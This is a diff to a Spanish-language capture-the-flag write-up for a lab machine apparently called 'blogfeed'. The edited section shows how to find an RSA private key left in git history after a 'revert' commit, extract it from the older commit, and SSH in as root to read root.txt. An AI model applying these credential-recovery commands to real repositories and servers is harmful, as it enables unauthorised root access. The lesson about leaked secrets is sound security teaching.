@@ -93,13 +93,15 @@ Aparecen `mv resources/authcredentials.key ...`, `git add` y `git commit`. El re
 ```bash
 cd ~/work/blogfeed
 git log --oneline
+# 33e87c3 reverted accidental commit with proper key
+# d387abf add key for feed integration from tnerprise backend
 git log -p | grep -A30 "BEGIN RSA PRIVATE KEY"
 ```
 
-Un commit posterior eliminó la clave; el anterior todavía la contiene:
+El commit `d387abf` añade la clave y `33e87c3` la «revierte»: el objeto antiguo sigue en el repositorio, así que el secreto no se ha borrado:
 
 ```bash
-git show <commit>:resources/integration/authcredentials.key > /tmp/root.key
+git show d387abf:resources/integration/authcredentials.key > /tmp/root.key
 chmod 600 /tmp/root.key
 ssh -i /tmp/root.key root@<IP>
 cat /root/root.txt
